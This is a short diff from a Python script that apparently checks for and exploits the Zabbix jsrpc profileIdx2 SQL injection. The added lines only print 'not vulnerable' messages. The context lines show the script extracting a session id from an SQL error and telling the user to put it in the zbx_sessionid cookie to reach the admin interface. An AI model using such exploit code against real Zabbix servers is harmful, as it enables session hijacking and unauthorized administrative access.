@@ -33,9 +33,11 @@ class zabbix_jsrpc_profileIdx2_sqli_BaseVerify:
                 end = req.text.find("~~~")
                 sessionid = str(req.text)[start:end].strip("Duplicate entry '")
                 cprint("[+]替换COOKIE中zbx_sessionid为 "+sessionid+" 登录至管理界面...", "green")
+            else:
+                cprint("[-]不存在zabbix_jsrpc_profileIdx2_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
